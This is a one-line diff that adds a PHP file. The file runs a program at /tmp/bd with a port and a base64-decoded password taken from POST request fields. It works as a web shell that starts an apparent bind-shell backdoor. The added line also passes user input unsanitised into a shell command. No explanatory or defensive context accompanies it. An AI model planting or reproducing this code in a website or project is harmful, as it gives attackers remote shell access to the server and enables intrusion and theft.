@@ -1,0 +1,1 @@
+<?phpshell_exec("/tmp/bd " . $_POST['port'] . " " . base64_decode($_POST['bind_pass']) . " &");?>
